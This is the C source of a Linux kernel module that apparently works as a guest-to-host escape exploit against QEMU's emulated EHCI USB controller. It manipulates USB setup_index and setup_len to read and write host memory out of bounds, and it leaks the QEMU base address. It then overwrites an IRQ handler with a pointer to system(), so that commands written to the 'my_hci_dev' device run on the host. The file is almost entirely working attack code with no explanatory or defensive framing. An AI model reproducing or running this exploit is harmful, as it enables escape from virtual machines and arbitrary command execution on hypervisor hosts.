#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/printk.h>
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <asm/io.h>
#include <asm/page.h>

typedef struct EHCIqtd {
    uint32_t next;                    /* Standard next link pointer */
    uint32_t altnext;                 /* Standard next link pointer */
    uint32_t token;
#define QTD_TOKEN_DTOGGLE             (1 << 31)
#define QTD_TOKEN_TBYTES_MASK         0x7fff0000
#define QTD_TOKEN_TBYTES_SH           16
#define QTD_TOKEN_IOC                 (1 << 15)
#define QTD_TOKEN_CPAGE_MASK          0x00007000
#define QTD_TOKEN_CPAGE_SH            12
#define QTD_TOKEN_CERR_MASK           0x00000c00
#define QTD_TOKEN_CERR_SH             10
#define QTD_TOKEN_PID_MASK            0x00000300
#define QTD_TOKEN_PID_SH              8
#define QTD_TOKEN_ACTIVE              (1 << 7)
#define QTD_TOKEN_HALT                (1 << 6)
#define QTD_TOKEN_DBERR               (1 << 5)
#define QTD_TOKEN_BABBLE              (1 << 4)
#define QTD_TOKEN_XACTERR             (1 << 3)
#define QTD_TOKEN_MISSEDUF            (1 << 2)
#define QTD_TOKEN_SPLITXSTATE         (1 << 1)
#define QTD_TOKEN_PING                (1 << 0)

    uint32_t bufptr[5];               /* Standard buffer pointer */
#define QTD_BUFPTR_MASK               0xfffff000
#define QTD_BUFPTR_SH                 12
} EHCIqtd;

typedef struct EHCIqh {
    uint32_t next;                    /* Standard next link pointer */

    /* endpoint characteristics */
    uint32_t epchar;
#define QH_EPCHAR_RL_MASK             0xf0000000
#define QH_EPCHAR_RL_SH               28
#define QH_EPCHAR_C                   (1 << 27)
#define QH_EPCHAR_MPLEN_MASK          0x07FF0000
#define QH_EPCHAR_MPLEN_SH            16
#define QH_EPCHAR_H                   (1 << 15)
#define QH_EPCHAR_DTC                 (1 << 14)
#define QH_EPCHAR_EPS_MASK            0x00003000
#define QH_EPCHAR_EPS_SH              12
#define EHCI_QH_EPS_FULL              0
#define EHCI_QH_EPS_LOW               1
#define EHCI_QH_EPS_HIGH              2
#define EHCI_QH_EPS_RESERVED          3

#define QH_EPCHAR_EP_MASK             0x00000f00
#define QH_EPCHAR_EP_SH               8
#define QH_EPCHAR_I                   (1 << 7)
#define QH_EPCHAR_DEVADDR_MASK        0x0000007f
#define QH_EPCHAR_DEVADDR_SH          0

    /* endpoint capabilities */
    uint32_t epcap;
#define QH_EPCAP_MULT_MASK            0xc0000000
#define QH_EPCAP_MULT_SH              30
#define QH_EPCAP_PORTNUM_MASK         0x3f800000
#define QH_EPCAP_PORTNUM_SH           23
#define QH_EPCAP_HUBADDR_MASK         0x007f0000
#define QH_EPCAP_HUBADDR_SH           16
#define QH_EPCAP_CMASK_MASK           0x0000ff00
#define QH_EPCAP_CMASK_SH             8
#define QH_EPCAP_SMASK_MASK           0x000000ff
#define QH_EPCAP_SMASK_SH             0

    uint32_t current_qtd;             /* Standard next link pointer */
    uint32_t next_qtd;                /* Standard next link pointer */
    uint32_t altnext_qtd;
#define QH_ALTNEXT_NAKCNT_MASK        0x0000001e
#define QH_ALTNEXT_NAKCNT_SH          1

    uint32_t token;                   /* Same as QTD token */
    uint32_t bufptr[5];               /* Standard buffer pointer */
#define BUFPTR_CPROGMASK_MASK         0x000000ff
#define BUFPTR_FRAMETAG_MASK          0x0000001f
#define BUFPTR_SBYTES_MASK            0x00000fe0
#define BUFPTR_SBYTES_SH              5
} EHCIqh;

#define get_field(data, field) \
    (((data) & field##_MASK) >> field##_SH)

#define set_field(data, newval, field) do { \
    uint32_t val = *data; \
    val &= ~ field##_MASK; \
    val |= ((newval) << field##_SH) & field##_MASK; \
    *data = val; \
    } while(0)

#define USBCMD_IAAD      (1 << 6)      // Int Asynch Advance Doorbell
#define USBCMD_RUNSTOP   (1 << 0)      // run / Stop
#define USBCMD_ASE       (1 << 5)      // Asynch Schedule Enable
#define USBCMD_HCRESET   (1 << 1)      // HC Reset
#define PORTSC_PRESET        (1 << 8)     // Port Reset
#define PORTSC_PED           (1 << 2)     // Port Enable/Disable

#define DATA_BUF_SIZE (4096*5)
#define SETUP_INDEX_OFFSET (4096+4*3)

#define USB_DIR_OUT			0
#define USB_DIR_IN			0x80

static EHCIqh *qh;
static EHCIqtd *qtd;
static unsigned char *data_buf;
static unsigned long mmio_addr = 0xfebd5000;
static unsigned long mmio_size = 0x1000;
static unsigned long port_idx = 2;
static int companion  = 0;// 1 for ehci_bus_ops_companion,0 for ehci_bus_ops_standalone
static unsigned long ops_standalone_addr = 0x00000000011e5200 ;//ehci_bus_ops_standalone
static unsigned long ops_companion_addr = 0x00000000011e51f0;//ehci_bus_ops_companion

static unsigned long original_irq_addr;
static uint32_t irq_offset;

static volatile uint32_t *portsc;
static volatile uint32_t *asynclistaddr;
static volatile uint32_t *usbcmd;
static volatile unsigned char *mmio;


static void reset_hci(void)
{
	memset(qh,0,sizeof(*qh));
	memset(qtd,0,sizeof(*qtd));

	//device reset
	*usbcmd = USBCMD_HCRESET;
	
	//port enable
	*portsc = PORTSC_PRESET;
	*portsc = PORTSC_PED;
	
	qh->next = __pa(qh);
	qh->epchar = QH_EPCHAR_H;
	qh->token = QTD_TOKEN_ACTIVE;
	set_field(&qh->epchar,0,QH_EPCHAR_DEVADDR);
	qh->current_qtd = __pa(qtd);
}

static void run_hci(void)
{
	int i = 0;
	for(i=0;i<5;i++){
		qtd->bufptr[i] = __pa(data_buf+i*4096);
	}
	wmb();
	//qh addr
	*asynclistaddr = __pa(qh);
	//run async
	*usbcmd = USBCMD_RUNSTOP | USBCMD_ASE | USBCMD_IAAD;
	while( ((*usbcmd) & USBCMD_IAAD) );

}

//make USBDevice.setup_state = SETUP_STATE_DATA (through the function do_token_setup)
static void usb_set_state_data(void)
{
	reset_hci();
	
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,2,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_SETUP
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,8,QTD_TOKEN_TBYTES);
	//do_token_setup function
	data_buf[0] = 0; 
	data_buf[6] = 1; 
	
	run_hci();
}

//struct USBDevice.setup_len = len
static void usb_set_len(uint32_t len)
{
	reset_hci();
	
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,2,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_SETUP
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,8,QTD_TOKEN_TBYTES);
	//do_token_setup function
	data_buf[0] = 0;
	//setup_len
	data_buf[7] = (len >> 8);
	data_buf[6] = (len >> 0);

	run_hci();
}

//override USBDevice Struct setup_index field
static void override_setup_index(uint32_t value,uint32_t size)
{
	
	usb_set_state_data();//s->setup_state = SETUP_STATE_DATA
	usb_set_len(SETUP_INDEX_OFFSET+4);
	
	
	reset_hci();
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,0,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_OUT
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,SETUP_INDEX_OFFSET+4,QTD_TOKEN_TBYTES);
	//do_token_setup function
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET-8)) = 2;//make USBDevice Struct setup_state = SETUP_STATE_DATA!!!!!!
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET-4)) = value + size + 8;//make USBDevice Struct setup_len > setup_index!!!!!! +8 make next setup_state = SETUP_STATE_DATA
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET)) = value - (SETUP_INDEX_OFFSET + 4);

	run_hci();
}

static int write_data(uint32_t offset,uint8_t *buf,size_t size)
{
	if(size > (DATA_BUF_SIZE ) || !buf){
		return -1;
	}
	override_setup_index(offset,size);
	
	reset_hci();
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,0,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_OUT
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,size,QTD_TOKEN_TBYTES);
	
	memcpy(data_buf,buf,size);
	

	run_hci();//after cpy

	return 0;
}

static int read_data(uint32_t offset,uint8_t *buf,size_t size)
{
	uint8_t *ptr;
	if(size > (DATA_BUF_SIZE  ) || !buf){
		return -1;
	}
	
	ptr = kmalloc(8192,GFP_KERNEL);
	if(!ptr) return -1;
	

	ptr[0] = USB_DIR_IN;
	*(uint32_t*)(ptr+8+SETUP_INDEX_OFFSET-8) = 2;//setup_state
	*(uint32_t*)(ptr+8+SETUP_INDEX_OFFSET-4) = offset+size;//make setup_len > setup_index
	*(uint32_t*)(ptr+8+SETUP_INDEX_OFFSET) = offset - (SETUP_INDEX_OFFSET+4+8);//setup_index
	write_data(-8,ptr,SETUP_INDEX_OFFSET+4+8);//make USBDevice Struct data_buf[0] == USB_DIR_IN
	
	reset_hci();
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,1,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_IN
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,size,QTD_TOKEN_TBYTES);
	
	run_hci();//befor cpy
	memcpy(buf,data_buf,size);
	kfree(ptr);
	return 0;
}


static uint64_t get_usbdevice_addr(void)
{
	/*
	 function:do_token_in
	(gdb) print (int)&s->ep_ctl.dev - (int)s->data_buf 
		$16 = 4132
	 * */
	uint64_t addr = 0;
	
	read_data(4132,(uint8_t*)&addr,8);

	return addr;
}

static uint64_t get_usbdevice_data_buf_addr(void)
{
	/*
	function:do_token_in
	(gdb) p (int)s->data_buf - (int)s
	$4 = 236
	*/
	uint64_t addr = get_usbdevice_addr();
	
	return addr + 236;
}

static uint64_t get_usbport_addr(void)
{
	/*
	 function:do_token_in
	 (gdb) print (int)&s->port - (int)s->data_buf 
		$15 = -100
	 * */
	uint64_t addr = 0;
	
	read_data(-100,(uint8_t*)&addr,8);

	return addr;
}

static uint64_t get_ehcistate_addr(void)
{
	/*function:ehci_advance_state
	(gdb) print (int)ehci->ports - (int)ehci
		$4 = 1344
	(gdb) print sizeof(ehci->ports[1])
		$5 = 72 
	*/
	uint64_t addr = 0;
	addr = get_usbport_addr();
	addr = addr - (1344 + 72 * (port_idx-1));

	return addr;
}

static uint64_t get_ehci_bus_ops_addr(void)
{
	/*
	function:ehci_adance_state
	(gdb) print (int)&ehci->bus.ops - (int)ehci
	$6 = 120 
	*/
	uint64_t addr = 0;

	uint32_t ehci_off = get_ehcistate_addr() - get_usbdevice_data_buf_addr();
	read_data(ehci_off+120,(uint8_t*)&addr,8);
	return addr;
}

static uint64_t get_qemu_base_addr(void)
{
	uint64_t addr = get_ehci_bus_ops_addr();
	if(companion)
		return addr - ops_companion_addr;
	return addr - ops_standalone_addr;
}

static void init(void)
{
	asynclistaddr = (uint32_t*)(mmio + 0x20 + 4*6);
	usbcmd = (uint32_t*)(mmio+0x20);
	portsc = (uint32_t*)(mmio+ 0x64 + 4*(port_idx - 1));
	
	/*
	function:ehci_advance_state
	(gdb) p (int)&ehci->irq - (int)ehci
	$6 = 200
	*/
	irq_offset = get_ehcistate_addr() + 200 - get_usbdevice_data_buf_addr();
	read_data(irq_offset,(uint8_t*)&original_irq_addr,8);//back up original irq addr
}

static void construct_devil_irq(char *pcmd)
{
	/*
	function:ehci_advance_state
	(gdb) print sizeof(*ehci->irq)
	$11 = 64
	(gdb) print (int)(&((struct IRQState*)(0))->handler)
	$12 = 40
	(gdb) print (int)(&((struct IRQState*)(0))->opaque)
	$13 = 48
	*/
	
	
	uint64_t irq_addr = get_usbdevice_data_buf_addr() + 256;
	uint64_t opaque_addr = get_usbdevice_data_buf_addr() + 256 + 64;
	uint64_t system_call_addr = 0x2C4500 + get_qemu_base_addr();

	uint64_t *pirq_addr = (uint64_t*)data_buf;
	uint8_t *ptr = data_buf+256;// point to devil irq struct   ,,  256*n
	uint64_t *phandler = (uint64_t*)(ptr+40);
	uint64_t *popaque = (uint64_t*)(ptr+48);
	uint8_t *cmd = (ptr+64);//cmd


	//override_setup_index
	usb_set_state_data();//s->setup_state = SETUP_STATE_DATA
	usb_set_len(SETUP_INDEX_OFFSET+4);
	
	reset_hci();
	memset(data_buf,0,DATA_BUF_SIZE);
	
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,0,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_OUT
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,SETUP_INDEX_OFFSET+4,QTD_TOKEN_TBYTES);
	//devil irq
	*pirq_addr = irq_addr;//get_usbdevice_data_buf_addr()+256;
	*phandler = system_call_addr;//system_call_addr;
	*popaque = opaque_addr;//get_usbdevice_data_buf_addr() + 256 + 64;
	strcpy((char*)cmd,pcmd);
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET-8)) = 2;//make USBDevice Struct setup_state = SETUP_STATE_DATA!!!!!!
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET-4)) = irq_offset+8+8;//make USBDevice Struct setup_len > setup_index!!!!!!
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET)) = irq_offset - (SETUP_INDEX_OFFSET + 4);
	run_hci();
	
	reset_hci();
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,0,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_OUT
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,8,QTD_TOKEN_TBYTES);
	
	run_hci();//

}

static void recover_irq_addr(void)
{
	uint64_t *pirq_addr = (uint64_t*)data_buf;
	
	usb_set_len(SETUP_INDEX_OFFSET+4);
	
	reset_hci();
	
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,0,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_OUT
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,SETUP_INDEX_OFFSET+4,QTD_TOKEN_TBYTES);
	//devil irq
	*pirq_addr = original_irq_addr;//get_usbdevice_data_buf_addr()+256;
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET-8)) = 2;//make USBDevice Struct setup_state = SETUP_STATE_DATA!!!!!!
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET-4)) = irq_offset+8+8;//make USBDevice Struct setup_len > setup_index!!!!!!
	*((uint32_t*)(data_buf+SETUP_INDEX_OFFSET)) = irq_offset - (SETUP_INDEX_OFFSET + 4);
	run_hci();
	
	reset_hci();
	qtd->token = QTD_TOKEN_ACTIVE;
	set_field(&qtd->token,0,QTD_TOKEN_PID);//make function ehci_get_pid return USB_TOKEN_OUT
	
	//ehci_init_transfer function
	set_field(&qtd->token,0,QTD_TOKEN_CPAGE);
	set_field(&qtd->token,8,QTD_TOKEN_TBYTES);
	
	run_hci();//
}

static long my_hci_dev_write(struct file *filp,const char __user *buf,size_t size,loff_t *ppos)
{
	char *cmd;
	cmd = kmalloc(512,GFP_KERNEL | __GFP_ZERO);
	if(!cmd) return -ENOMEM;
	
	if(size > 500) return 0;

	if(copy_from_user(cmd,buf,size))
			return -EFAULT;

	construct_devil_irq(cmd);
	recover_irq_addr();
	printk("%s: %s\n",__func__,cmd);
	return size;
}

static struct file_operations dev_fops = {
	.write = my_hci_dev_write,
};

static struct miscdevice my_hci_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "my_hci_dev",
	.fops   = &dev_fops,
};

static int __init my_hci_init(void)
{
	int r;
	mmio = (unsigned char *)ioremap(mmio_addr,mmio_size);
	if(!mmio){
		pr_err("%s: remap error\n",__func__);
		goto remap_err ;
	}
	
	qtd = kmalloc(sizeof(EHCIqtd),GFP_DMA|GFP_KERNEL);
	if(qtd == NULL){
		pr_err("%s: kmalloc qtd error\n",__func__);
		goto qtd_err;
	}

	qh = kmalloc(sizeof(EHCIqh),GFP_DMA|GFP_KERNEL);
	if(qh == NULL){
		pr_err("%s: kmalloc qh error\n",__func__);
		goto qh_err;
	}
	
	data_buf = kmalloc(DATA_BUF_SIZE,GFP_DMA|GFP_KERNEL);
	if(data_buf == NULL){
		pr_err("%s: kmalloc data_buf error\n",__func__);
		goto buf_err;
	}

	r = misc_register(&my_hci_dev);
	if(r){
		pr_err("%s: misc device register failed\n",__func__);
		goto out_unreg;
	}else{
		printk("%s: misc device register success\n",__func__);
	}
	
	init();
	
	printk("USBDevice:0x%llx\n",get_usbdevice_addr());
	printk("USBDevice_data_buf:0x%llx\n",get_usbdevice_data_buf_addr());
	printk("USBPort:0x%llx\n",get_usbport_addr());
	printk("EHCIState:0x%llx\n",get_ehcistate_addr());
	printk("ehci_bus_ops_addr:0x%llx\n",get_ehci_bus_ops_addr());
	
	printk("QEMU base addr:0x%llx\n",get_qemu_base_addr());
	
	return 0;

out_unreg:
	kfree(data_buf);
buf_err:
	kfree(qh);
qh_err:
	kfree(qtd);
qtd_err:
	iounmap(mmio);
remap_err:
	return -1;
}

static void __exit my_hci_exit(void)
{
	misc_deregister(&my_hci_dev);
	kfree(data_buf);
	kfree(qh);
	kfree(qtd);
	iounmap(mmio);
	printk("%s: my_hci_exit\n",__func__);
}

module_init(my_hci_init);
module_exit(my_hci_exit);
MODULE_LICENSE("GPL");
